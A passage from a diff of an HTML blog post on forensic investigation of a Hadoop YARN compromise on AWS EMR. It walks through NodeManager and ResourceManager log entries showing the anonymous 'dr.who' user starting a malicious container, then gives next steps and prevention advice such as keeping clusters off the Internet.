+</span></span><span style=display:flex><span>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.ContainerManagerImpl <span style=color:#2c5dcd>(</span>IPC Server handler <span style=color:#5918bb;font-weight:700>32</span> on default port 8041<span style=color:#2c5dcd>)</span>: Start request <span style=color:#2c5dcd;font-weight:700>for</span> container_1590702911576_0016_01_000001 by user dr.who
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.ContainerManagerImpl <span style=color:#2c5dcd>(</span>IPC Server handler <span style=color:#5918bb;font-weight:700>32</span> on default port 8041<span style=color:#2c5dcd>)</span>: Creating a new application reference <span style=color:#2c5dcd;font-weight:700>for</span> app application_1590702911576_0016
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Application application_1590702911576_0016 transitioned from NEW to INITING
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex;background-color:#e5e5e5><span>2020-06-20 20:09:04,280 INFO org.apache.hadoop.yarn.server.nodemanager.NMAuditLogger <span style=color:#2c5dcd>(</span>IPC Server handler <span style=color:#5918bb;font-weight:700>32</span> on default port 8041<span style=color:#2c5dcd>)</span>: USER<span style=color:#2c5dcd>=</span>dr.who IP<span style=color:#2c5dcd>=</span>172.31.18.33 OPERATION<span style=color:#2c5dcd>=</span>Start Container Request TARGET<span style=color:#2c5dcd>=</span>ContainerManageImpl RESULT<span style=color:#2c5dcd>=</span>SUCCESS APPID<span style=color:#2c5dcd>=</span>application_1590702911576_0016 CONTAINERID<span style=color:#2c5dcd>=</span>container_1590702911576_0016_01_000001
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Adding container_1590702911576_0016_01_000001 to application application_1590702911576_0016
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.application.ApplicationImpl <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Application application_1590702911576_0016 transitioned from INITING to RUNNING
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.container.ContainerImpl <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Container container_1590702911576_0016_01_000001 transitioned from NEW to SCHEDULED
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.AuxServices <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Got event CONTAINER_INIT <span style=color:#2c5dcd;font-weight:700>for</span> appId application_1590702911576_0016
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2020-06-20 20:09:04,292 INFO org.apache.spark.network.yarn.YarnShuffleService <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Initializing container container_1590702911576_0016_01_000001
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2020-06-20 20:09:04,292 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.scheduler.ContainerScheduler <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Starting container <span style=color:#2c5dcd>[</span>container_1590702911576_0016_01_000001<span style=color:#2c5dcd>]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2020-06-20 20:09:04,305 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.container.ContainerImpl <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Container container_1590702911576_0016_01_000001 transitioned from SCHEDULED to RUNNING
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2020-06-20 20:09:04,305 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl <span style=color:#2c5dcd>(</span>NM ContainerManager dispatcher<span style=color:#2c5dcd>)</span>: Starting resource-monitoring <span style=color:#2c5dcd;font-weight:700>for</span> container_1590702911576_0016_01_000001
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex;background-color:#e5e5e5><span>2020-06-20 20:09:05,867 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl <span style=color:#2c5dcd>(</span>Container Monitor<span style=color:#2c5dcd>)</span>: container_1590702911576_0016_01_000001<span style=color:#fff;background-color:#c00>&#39;</span>s ip <span style=color:#2c5dcd>=</span> 172.31.22.26, and hostname <span style=color:#2c5dcd>=</span> ip-172-31-22-26.ec2.internal
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2020-06-20 20:09:05,873 INFO org.apache.hadoop.yarn.server.nodemanager.containermanager.monitor.ContainersMonitorImpl <span style=color:#2c5dcd>(</span>Container Monitor<span style=color:#2c5dcd>)</span>: Skipping monitoring container container_1590702911576_0016_01_000001 since CPU usage is not yet available.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2020-06-20 20:09:35,593 ERROR org.apache.hadoop.yarn.server.nodemanager.NodeStatusUpdaterImpl <span style=color:#2c5dcd>(</span>Node Status Updater<span style=color:#2c5dcd>)</span>: NM node labels <span style=color:#2c5dcd>{}</span> were not accepted by RM and message from RM : null</span></span></code></pre></td></tr></table></div></div><p>On line 9 in the logs above we can see that the anonymous user &lsquo;dr.who&rsquo; requested to start a container, the application ID, and the container ID for the particular request. On line 27 we can see the node within our cluster which ran the malicious application.</p><p>Additional logs can be found on the nodes themselves. Another way we can see activity is by pulling the hadoop-yarn-resourcemanager logs out of the primary server.</p><p>Within this log source we can see lines similar to the one below that show the resourcemanager assigning our malicious container <code>container_1590702911576_0016_01_000001</code> work to the <code>172.31.22.26</code> host. This is a great way to determine which host(s) the malicious activity occured on.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>2020-06-20 20:09:04,269 INFO org.apache.hadoop.yarn.server.resourcemanager.scheduler.common.fica.FiCaSchedulerNode <span style=color:#2c5dcd>(</span>SchedulerEventDispatcher:Event Processor<span style=color:#2c5dcd>)</span>: Assigned container container_1590702911576_0016_01_000001 of capacity memory:32, vCores:1 on host ip-172-31-22-26.ec2.internal:8041, which has <span style=color:#5918bb;font-weight:700>1</span> containers, memory:32, vCores:1 used and memory:12256, vCores:3 available after allocation
+</span></span></code></pre></td></tr></table></div></div><p>Other helpful information can be pulled from this log source. The following log entry shows the initial application creation request:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>2020-06-20 20:09:04,216 INFO org.apache.hadoop.yarn.server.resourcemanager.RMAuditLogger <span style=color:#2c5dcd>(</span>qtp677217562-27<span style=color:#2c5dcd>)</span>: USER<span style=color:#2c5dcd>=</span>dr.who OPERATION<span style=color:#2c5dcd>=</span>Submit Application Request TARGET<span style=color:#2c5dcd>=</span>ClientRMService RESULT<span style=color:#2c5dcd>=</span>SUCCESS APPID<span style=color:#2c5dcd>=</span>application_1590702911576_0016 QUEUENAME<span style=color:#2c5dcd>=</span>default
+</span></span></code></pre></td></tr></table></div></div><p>Combining several other log entries from this file will show the entire lifecyle of the application. This is very helpful when attempting to pull together a detailed timeline of all the events.</p><hr><h3 id=next-steps>Next Steps</h3><p>Now that we have a general understanding of what occured, and where it occured we have to begin digging into the activity that occured on the node which spawned the reverse shell. If there are hundreds of application run requests they will all have to be examined. Without an understanding of each request it&rsquo;s hard to say exactly what occured or which nodes were potentially compromised.</p><hr><h3 id=prevention>Prevention</h3><p>Preventing this behavior is straight forward, do not expose EMR clusters to the Internet. Thats it. Make sure the security groups associated with each node in the cluster are scoped to the minium access required to manage and maintain the systems. There is even a GuardDuty alert <a href=https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_recon.html#PortProbeEMRUnprotectedPort>Port Probe EMR Unprotected Port</a>. That will fire if someone scans a sensitive port (8088).</p><hr><h3 id=additional-resources>Additional Resources</h3><p>Additional references, I leaned on these heavily while trying to better understand this space:</p><ul><li><a href=https://blog.radware.com/security/2018/11/hadoop-yarn-an-assessment-of-the-attack-surface-and-its-exploits/>Hadoop YARN: An Assessment of the Attack Surface and Its Exploits</a></li><li><a href=https://medium.com/@ivan.vasquez/dont-let-dr-who-hijack-your-emr-cluster-9bb67daa4641>Don&rsquo;t let Dr.Who hijack your EMR cluster</a></li><li><a href=https://medium.com/@neerajsabharwal/hadoop-yarn-hack-9a72cc1328b6>Hadoop Yarn hack?</a></li></ul></div></div><div class=col-md-3 id=sidebar data-spy=affix-bottom data-offset-top=0><nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id=post-nav><h5>contents</h5><ul class="nav post-sidenav"><li><nav id=TableOfContents><ul><li><ul><li><a href=#setting-up-a-cluster>Setting Up a Cluster</a></li><li><a href=#compromising-emr>Compromising EMR</a></li><li><a href=#logging>Logging</a></li><li><a href=#next-steps>Next Steps</a></li><li><a href=#prevention>Prevention</a></li><li><a href=#additional-resources>Additional Resources</a></li></ul></li></ul></nav></li></ul></nav></div></div></div></div><footer></footer></body><script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script>
 <script src=https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js integrity=sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1 crossorigin=anonymous></script>
 <script src=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js integrity=sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM crossorigin=anonymous></script>
-<script>includeHTML()</script>
-</html>
+<script>includeHTML()</script></html>
